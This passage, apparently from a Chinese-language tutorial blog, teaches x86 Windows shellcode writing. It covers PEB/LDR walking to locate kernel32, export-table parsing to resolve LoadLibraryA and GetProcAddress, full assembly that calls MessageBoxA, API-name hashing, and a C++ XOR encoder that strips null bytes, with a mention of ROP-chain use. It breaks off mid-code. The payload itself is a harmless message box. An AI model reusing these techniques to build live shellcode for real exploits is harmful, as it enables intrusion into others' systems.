class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PEB</span><br><span class="line">&#123;</span><br><span class="line">    +<span class="number">0x00c</span> _PEB_LDR_DATA* Ldr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    +<span class="number">0x000</span> Uint length;</span><br><span class="line">    +<span class="number">0x004</span> Uchar initialized;</span><br><span class="line">    +<span class="number">0x008</span> LVOID SsHandle;</span><br><span class="line">    +<span class="number">0x00c</span> _LIST_ENTRY InloadOrderModuleList; <span class="comment">//载入顺序排序的dll</span></span><br><span class="line">    +<span class="number">0x014</span> _LIST_ENTRY InMemoryOrderModuleList; <span class="comment">//内存排序的dll</span></span><br><span class="line">    +<span class="number">0x01c</span> _LIST_ENTRY InitializationOrderModuleList; <span class="comment">//初始化排序的dll</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化排序一般不会变动，所以用到它，第一个为ntdll，第二个kernel32或kernelbase；</p><p>_LIST_ENTRY是一个双头链表，其中只有两个字段，指向上一个和下一个结构体的指针； </p><p>_LIST_ENTRY其实为一个结构体内部的子结构体，数据信息放在其父结构体中,父结构体存放dll信息；</p><p><img src="https://s2.loli.net/2023/06/12/b8tJhnKUIfdpAzY.png" alt="LDR"></p><p>父结构体：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _LIST_ENTRY InloadOrderModuleList; <span class="comment">//载入顺序排序的dll</span></span><br><span class="line">    _LIST_ENTRY InMemoryOrderModuleList; <span class="comment">//内存排序的dll</span></span><br><span class="line">    _LIST_ENTRY InitializationOrderModuleList; <span class="comment">//初始化排序的dll</span></span><br><span class="line">    PVOID DllBase;<span class="comment">//dll基地址，要得到的模块</span></span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    PVOID SizeOfImage;</span><br><span class="line">    PVOID FullDllName;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>则得到dll基址所需汇编码为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov esi, fs:[0x30] ;得到peb</span><br><span class="line">mov esi, [esi+0xc] ;得到ldr</span><br><span class="line">mov esi, [esi+0x1c];得到_LIST_ENTRY</span><br><span class="line">mov esi, [esi]   ;得到下一个结构体（kernel32）</span><br><span class="line">mov esi, [esi+0x8] ;得到dllbase(32位,两个指针类型占8字节)</span><br></pre></td></tr></table></figure><p>对于windows段寄存器的操作别用keystone找机械码，有问题，就用裸函数写内联ida提取；</p><p>得到dllbase后，需要找到导出表，与其中的目标函数名称做比较确定真实地址；</p><p>需要确定 “LoadLibraryA”，“GetProcAddress”；</p><p>对于字符串比较不能使用strcmp系统函数，需要自实现汇编，相同返回0，不同返回1：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Mystrcmp</span>()</span><br><span class="line"> &#123;</span><br><span class="line">     _asm</span><br><span class="line">     &#123;</span><br><span class="line">         lea esi, [strA]<span class="comment">//函数三个参数</span></span><br><span class="line">         lea edi, [strB]</span><br><span class="line">         mov ecx, 循环次数</span><br><span class="line">         repe cmpsb<span class="comment">//循环比较</span></span><br><span class="line">         je Equal</span><br><span class="line">         mov eax, <span class="number">1</span></span><br><span class="line">         jmp End</span><br><span class="line">         Equal:</span><br><span class="line">         mov eax, <span class="number">0</span></span><br><span class="line">         End:</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>repe cmpsb需要DF标志位置零向后比较；</p><h2 id="小实验：利用PEB获取user32模块调用MessageBoxA"><a href="#小实验：利用PEB获取user32模块调用MessageBoxA" class="headerlink" title="小实验：利用PEB获取user32模块调用MessageBoxA"></a>小实验：利用PEB获取user32模块调用MessageBoxA</h2><p>大体思路：</p><ul><li>获取关键API： loadLibrary，getprocaddress，这样不管是什么模块中的什么函数都能使用；</li><li>获取kernel32模块：获取以实现第一步，两个关键API在此模块中；</li><li>使用两个API得到MessageBoxA的函数地址；</li><li>调用MessageBoxA；</li></ul><p>如何得到两个关键API呢？</p><p>用之前分析的方法：通过TEB-&gt;PEB-&gt;LDR-&gt;dllbase，找到dll基址，通过基址以及PE结构的知识得到dll的导出表，遍历函数名称表（ENT）和目标函数（loadlibrary，getprocaddress）名称比较得到函数索引，根据索引和函数序数表（EOT）得到此函数的地址表（EAT）索引，则得到两个关键API的地址；</p><h3 id="写入字符串（函数名）"><a href="#写入字符串（函数名）" class="headerlink" title="写入字符串（函数名）"></a>写入字符串（函数名）</h3><p>写入要比较的两个关键API字符串，以及调用API函数需要的其他字符串；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//LoadLibraryA</span></span><br><span class="line"><span class="comment">//GetProcAddress</span></span><br><span class="line"><span class="comment">//user32.dll</span></span><br><span class="line"><span class="comment">//MessageBoxA</span></span><br><span class="line"><span class="comment">//Second_BC</span></span><br><span class="line"><span class="comment">//以上字符串放入栈，栈中顺序也如上排序</span></span><br><span class="line"><span class="comment">//第一步，保存字符串信息</span></span><br><span class="line">pushad                  </span><br><span class="line">sub esp, <span class="number">0x30</span></span><br><span class="line">mov ax, <span class="number">0x0043</span></span><br><span class="line">mov word ptr ds:[esp - <span class="number">2</span>], ax   <span class="comment">//这种写法节省空间</span></span><br><span class="line">sub esp, <span class="number">2</span></span><br><span class="line">push <span class="number">0x425f646e</span></span><br><span class="line">push <span class="number">0x6f636553</span></span><br><span class="line">push <span class="number">0x41786f</span></span><br><span class="line">push <span class="number">0x42656761</span></span><br><span class="line">push <span class="number">0x7373654d</span></span><br><span class="line">mov byte ptr ds:[esp - <span class="number">1</span>], <span class="number">0x0</span></span><br><span class="line">sub esp, <span class="number">0x1</span></span><br><span class="line">mov ax, <span class="number">0x6c6c</span></span><br><span class="line">mov word ptr ds:[esp - <span class="number">2</span>], ax</span><br><span class="line">sub esp, <span class="number">0x2</span></span><br><span class="line">push <span class="number">0x642e3233</span></span><br><span class="line">push <span class="number">0x72657375</span></span><br><span class="line">mov byte ptr ds:[esp - <span class="number">1</span>], <span class="number">0x0</span></span><br><span class="line">sub esp, <span class="number">0x1</span></span><br><span class="line">mov ax, <span class="number">0x7373</span></span><br><span class="line">mov word ptr ds:[esp - <span class="number">2</span>], ax</span><br><span class="line">sub esp, <span class="number">0x2</span></span><br><span class="line">push <span class="number">0x65726464</span></span><br><span class="line">push <span class="number">0x41636f72</span></span><br><span class="line">push <span class="number">0x50746547</span></span><br><span class="line">mov byte ptr ds:[esp - <span class="number">1</span>], <span class="number">0x0</span></span><br><span class="line">sub esp, <span class="number">0x1</span></span><br><span class="line">push <span class="number">0x41797261</span></span><br><span class="line">push <span class="number">0x7262694c</span></span><br><span class="line">push <span class="number">0x64616f4c</span></span><br><span class="line">mov ecx, esp</span><br><span class="line">push ecx</span><br><span class="line">call fun_payload<span class="comment">//主体实现，之后给出，一个参数，即这些字符串首地址</span></span><br><span class="line">popad</span><br></pre></td></tr></table></figure><h3 id="获取kernel32-dll基址"><a href="#获取kernel32-dll基址" class="headerlink" title="获取kernel32.dll基址"></a>获取kernel32.dll基址</h3><p>用到了上述peb知识；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第二步，获取kernel32.dll基址</span></span><br><span class="line">fun_GetModule:</span><br><span class="line">        push ebp</span><br><span class="line">        mov ebp, esp</span><br><span class="line">        sub esp, <span class="number">0xc</span></span><br><span class="line">        push esi</span><br><span class="line">        mov esi, dword ptr fs:[<span class="number">0x30</span>]    <span class="comment">//peb地址</span></span><br><span class="line">        mov esi, [esi + <span class="number">0xc</span>]            <span class="comment">//ldr地址</span></span><br><span class="line">        mov esi, [esi + <span class="number">0x1c</span>]           <span class="comment">//list_entry</span></span><br><span class="line">        mov esi, [esi]                  <span class="comment">//list_entry第二项,kernel32</span></span><br><span class="line">        mov esi, [esi + <span class="number">0x8</span>]            <span class="comment">//dllbase</span></span><br><span class="line">        mov eax, esi</span><br><span class="line">        pop esi</span><br><span class="line">        mov esp, ebp</span><br><span class="line">        pop ebp</span><br><span class="line">        retn</span><br></pre></td></tr></table></figure><h3 id="获取两个重量级API"><a href="#获取两个重量级API" class="headerlink" title="获取两个重量级API"></a>获取两个重量级API</h3><p>用到pe结构知识；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//32位偏移计算</span></span><br><span class="line"><span class="comment">// MyGetProcAddress(imageBase, funName, nameLen)</span></span><br><span class="line"><span class="comment">// ImageBase + 0x3c = nt头</span></span><br><span class="line"><span class="comment">// nt头 + 0x78 = dataDirectory 第一项 导出表</span></span><br><span class="line"><span class="comment">// EAT = 导出表 + 0x1c</span></span><br><span class="line"><span class="comment">// ENT = 导出表 + 0x20</span></span><br><span class="line"><span class="comment">// EOT = 导出表 + 0x24</span></span><br><span class="line"><span class="comment">//第三步，获取导出表查找所需函数</span></span><br><span class="line">fun_GetProcAddr:</span><br><span class="line">        push ebp</span><br><span class="line">        mov ebp, esp</span><br><span class="line">        sub esp, <span class="number">0x20</span></span><br><span class="line">        push esi</span><br><span class="line">        push edi</span><br><span class="line">        push edx</span><br><span class="line">        push ebx</span><br><span class="line">        push ecx</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//获取函数地址表，函数序数表，函数名称表</span></span><br><span class="line">        mov edx, [ebp + <span class="number">0x8</span>]            <span class="comment">//第一个参dllbase</span></span><br><span class="line">        mov esi, [edx + <span class="number">0x3c</span>]           <span class="comment">//lf_anew</span></span><br><span class="line">        lea esi, [edx + esi]            <span class="comment">//nt头 = base + lf_anew</span></span><br><span class="line">        mov esi, [esi + <span class="number">0x78</span>]           <span class="comment">//导出表RVA</span></span><br><span class="line">        lea esi, [edx + esi]            <span class="comment">//导出表VA</span></span><br><span class="line">        mov edi, [esi + <span class="number">0x1c</span>]           <span class="comment">//EAT RVA</span></span><br><span class="line">        lea edi, [edx + edi]            <span class="comment">//EAT</span></span><br><span class="line">        mov [ebp - <span class="number">0x4</span>], edi            </span><br><span class="line">        mov edi, [esi + <span class="number">0x20</span>]           <span class="comment">//ENT RVA</span></span><br><span class="line">        lea edi, [edx + edi]            <span class="comment">//ENT</span></span><br><span class="line">        mov [ebp - <span class="number">0x8</span>], edi</span><br><span class="line">        mov edi, [esi + <span class="number">0x24</span>]           <span class="comment">//EOT RVA</span></span><br><span class="line">        lea edi, [edx + edi]            <span class="comment">//EOT</span></span><br><span class="line">        mov [ebp - <span class="number">0xc</span>], edi</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用ENT循环比较函数名得到目标函数的序数表index</span></span><br><span class="line">        <span class="comment">//ENT和EOT索引同步</span></span><br><span class="line">        <span class="keyword">xor</span> eax, eax                    <span class="comment">//循环控制 i = 0</span></span><br><span class="line">        cld                             <span class="comment">//DF标志位置为0，使比较时edi，esi往下加不是减</span></span><br><span class="line">        jmp tag_cmpFirst</span><br><span class="line">    tag_cmpLoop:</span><br><span class="line">        inc eax                         <span class="comment">//i++</span></span><br><span class="line">    tag_cmpFirst:</span><br><span class="line">        mov esi, [ebp - <span class="number">0x8</span>]            <span class="comment">//ENT</span></span><br><span class="line">        mov esi, [esi + eax*<span class="number">4</span>]          <span class="comment">//RVA</span></span><br><span class="line">        lea esi, [edx + esi]            <span class="comment">//函数名称地址</span></span><br><span class="line">        mov edi, [ebp + <span class="number">0xc</span>]            <span class="comment">//传入二参，目标函数名称地址</span></span><br><span class="line">        mov ecx, [ebp + <span class="number">0x10</span>]           <span class="comment">//三参，循环次数</span></span><br><span class="line">        repe cmpsb                      <span class="comment">//esi, edi字符串比较</span></span><br><span class="line">        jne tag_cmpLoop</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//根据已知EOT索引获取EAT中地址</span></span><br><span class="line">        mov esi, [ebp - <span class="number">0xc</span>]            <span class="comment">//EOT</span></span><br><span class="line">        <span class="keyword">xor</span> edi, edi</span><br><span class="line">        mov di, [esi + eax*<span class="number">2</span>]           <span class="comment">//word类型乘2，得到EAT索引</span></span><br><span class="line"></span><br><span class="line">        mov ebx, [ebp - <span class="number">0x4</span>]            <span class="comment">//EAT</span></span><br><span class="line">        mov esi, [ebx + edi*<span class="number">4</span>]          <span class="comment">//函数地址rva</span></span><br><span class="line">        lea eax, [edx + esi]            <span class="comment">//返回目标函数地址</span></span><br><span class="line"></span><br><span class="line">        pop ecx</span><br><span class="line">        pop ebx</span><br><span class="line">        pop edx</span><br><span class="line">        pop edi</span><br><span class="line">        pop esi</span><br><span class="line">        mov esp, ebp</span><br><span class="line">        pop ebp</span><br><span class="line">        retn <span class="number">0xc</span>                        <span class="comment">//接收三个参数</span></span><br></pre></td></tr></table></figure><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>第一步跳转的主要的思路实现；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第四步，payload</span></span><br><span class="line">fun_payload:</span><br><span class="line">        push ebp</span><br><span class="line">        mov ebp, esp</span><br><span class="line">        sub esp, <span class="number">0x20</span></span><br><span class="line">        push esi</span><br><span class="line">        push edi</span><br><span class="line">        push edx</span><br><span class="line">        push ebx</span><br><span class="line">        push ecx</span><br><span class="line"></span><br><span class="line">        <span class="comment">//dll基址</span></span><br><span class="line">        call fun_GetModule</span><br><span class="line">        mov [ebp - <span class="number">0x4</span>], eax</span><br><span class="line"></span><br><span class="line">        <span class="comment">//LoadLibraryA地址</span></span><br><span class="line">        push <span class="number">0xd</span>    </span><br><span class="line">        mov ecx, [ebp + <span class="number">0x8</span>]            <span class="comment">//获取字符串首地址</span></span><br><span class="line">        push ecx</span><br><span class="line">        push eax</span><br><span class="line">        call fun_GetProcAddr</span><br><span class="line">        mov [ebp - <span class="number">0x8</span>], eax            <span class="comment">//LoadLibraryA地址</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//GetProcAddress地址</span></span><br><span class="line">        push <span class="number">0xf</span>        </span><br><span class="line">        lea ecx, [ecx + <span class="number">0xd</span>]            <span class="comment">//获取字符串</span></span><br><span class="line">        push ecx</span><br><span class="line">        push [ebp - <span class="number">0x4</span>]</span><br><span class="line">        call fun_GetProcAddr</span><br><span class="line">        mov [ebp - <span class="number">0xc</span>], eax            <span class="comment">//GetProcAddress地址</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//用load加载user32.dll</span></span><br><span class="line">        mov ecx, [ebp + <span class="number">0x8</span>]            <span class="comment">//获取user32字符串</span></span><br><span class="line">        lea ecx, [ecx + <span class="number">0x1c</span>]</span><br><span class="line">        push ecx</span><br><span class="line">        call [ebp - <span class="number">0x8</span>]</span><br><span class="line">        mov [ebp - <span class="number">0x10</span>], eax           <span class="comment">//user32.dll基址</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//用getprocaddr获取messagebox地址</span></span><br><span class="line">        mov ecx, [ebp + <span class="number">0x8</span>]            <span class="comment">//获取messagebox字符串</span></span><br><span class="line">        lea ecx, [ecx + <span class="number">0x27</span>]</span><br><span class="line">        push ecx</span><br><span class="line">        push [ebp - <span class="number">0x10</span>]</span><br><span class="line">        call [ebp - <span class="number">0xc</span>]</span><br><span class="line">        mov [ebp - <span class="number">0x14</span>], eax           <span class="comment">//MessageBoxA地址</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用messagebox</span></span><br><span class="line">        mov ecx, [ebp + <span class="number">0x8</span>]             <span class="comment">//获取Second_BC</span></span><br><span class="line">        lea ecx, [ecx + <span class="number">0x33</span>]</span><br><span class="line">        <span class="keyword">xor</span> eax, eax</span><br><span class="line">        push eax</span><br><span class="line">        push ecx</span><br><span class="line">        push ecx</span><br><span class="line">        push eax</span><br><span class="line">        call [ebp - <span class="number">0x14</span>]</span><br><span class="line"></span><br><span class="line">        pop ecx</span><br><span class="line">        pop ebx</span><br><span class="line">        pop edx</span><br><span class="line">        pop edi</span><br><span class="line">        pop esi</span><br><span class="line">        mov esp, ebp</span><br><span class="line">        pop ebp</span><br><span class="line">        retn <span class="number">0x4</span>                        <span class="comment">//接收一个参数，输出字符串地址</span></span><br></pre></td></tr></table></figure><p>以上代码用裸函数外套即可使用：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> _declspec(naked)<span class="built_in">shellCode</span>()</span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用ida提取之后的机械码shellcode即可放到ROP链中使用，前提是有漏洞；</p><h2 id="字符串优化"><a href="#字符串优化" class="headerlink" title="字符串优化"></a>字符串优化</h2><p>由于在上一步写入字符串这里，会引进\x00以及大量的字符串导致内存浪费，此处有一个方法使其优化：编码；</p><p>构造一个函数，使得字符串通过之后输出其对应的4字节哈希值，写入时写入哈希值，此时满足不破坏比较时的一个逻辑：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">getHash</span><span class="params">(<span class="keyword">char</span>* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD digest = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (*str)</span><br><span class="line">    &#123;</span><br><span class="line">        digest = (digest &lt;&lt; <span class="number">25</span> | digest &gt;&gt; <span class="number">7</span>);</span><br><span class="line">        digest = digest + *str;</span><br><span class="line">        str++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> digest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> _declspec(naked)<span class="built_in">asmGetHash</span>()</span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        push ebp</span><br><span class="line">        mov ebp, esp</span><br><span class="line">        sub esp, <span class="number">0x4</span></span><br><span class="line">        push ecx</span><br><span class="line">        push edx</span><br><span class="line">        push ebx</span><br><span class="line">        push esi</span><br><span class="line"></span><br><span class="line">        mov dword ptr [ebp - <span class="number">0x4</span>], <span class="number">0</span>    <span class="comment">//digest = 0</span></span><br><span class="line">        lea esi, [ebp + <span class="number">0x8</span>]            <span class="comment">//str</span></span><br><span class="line">        <span class="keyword">xor</span> ecx, ecx                    <span class="comment">//i = 0</span></span><br><span class="line">    tag_hashLoop:</span><br><span class="line">        <span class="keyword">xor</span> eax, eax</span><br><span class="line">        mov al, [esi + ecx]             <span class="comment">//取第i个字符</span></span><br><span class="line">        test al, al</span><br><span class="line">        jz tag_end</span><br><span class="line">        mov ebx, [ebp - <span class="number">0x4</span>]</span><br><span class="line">        shl ebx, <span class="number">0x19</span>                   <span class="comment">//digest &lt;&lt; 25</span></span><br><span class="line">        mov edx, [ebp - <span class="number">0x4</span>]</span><br><span class="line">        shr edx, <span class="number">0x7</span>                    <span class="comment">//digest &gt;&gt; 7</span></span><br><span class="line">        <span class="keyword">or</span> ebx, edx                     <span class="comment">// |</span></span><br><span class="line">        add ebx, eax                    <span class="comment">// + </span></span><br><span class="line">        mov [ebp - <span class="number">0x4</span>], ebx            <span class="comment">//digest = ...</span></span><br><span class="line">        inc ecx                         <span class="comment">//i++</span></span><br><span class="line">        jmp tag_hashLoop</span><br><span class="line">    tag_end:</span><br><span class="line">        mov eax, [ebp - <span class="number">0x4</span>]</span><br><span class="line"></span><br><span class="line">        pop esi</span><br><span class="line">        pop ebx</span><br><span class="line">        pop edx</span><br><span class="line">        pop ecx</span><br><span class="line">        mov esp, ebp</span><br><span class="line">        pop ebp</span><br><span class="line">        retn <span class="number">0x4</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编码优化"><a href="#编码优化" class="headerlink" title="编码优化"></a>编码优化</h2><p>除了字符串，代码中也会出现大量\x00，由此对代码进行编码处理，且编码可逆，输入过程中不出现\x00，进入程序内部后自解密为真实代码执行；</p><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>思路是使用异或对每个字节编码，长度不变，编码后的内容不应该有\x00，则选择的异或key有讲究；</p><p>在 0x01 ~ 0xff 之间遍历出一个可以使用的key进行异或；</p><p>则编码代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">enShellcode</span><span class="params">(<span class="keyword">char</span> * shellcode, <span class="keyword">int</span> shelllen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BOOL result = TRUE;</span><br><span class="line"><span class="keyword">int</span> nkey = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* encodebuff = <span class="keyword">new</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>[shelllen];</span><br><span class="line"><span class="comment">//遍历合适的key</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> key = <span class="number">0x1</span>; key &lt; <span class="number">0xff</span>; key++)</span><br><span class="line">&#123;</span><br><span class="line">result = TRUE;</span><br><span class="line">nkey = key;</span><br><span class="line"><span class="comment">//循环编码</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; shelllen; i++)</span><br><span class="line">&#123;</span><br><span class="line">encodebuff[i] = shellcode[i] ^ key;</span><br><span class="line"><span class="keyword">if</span> (encodebuff[i] == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">result = FALSE;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (result == TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (result == FALSE)</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line"><span class="comment">//格式化打印</span></span><br><span class="line">FILE* fp;</span><br><span class="line"><span class="built_in">fopen_s</span>(&amp;fp, <span class="string">&quot;encode.txt&quot;</span>, 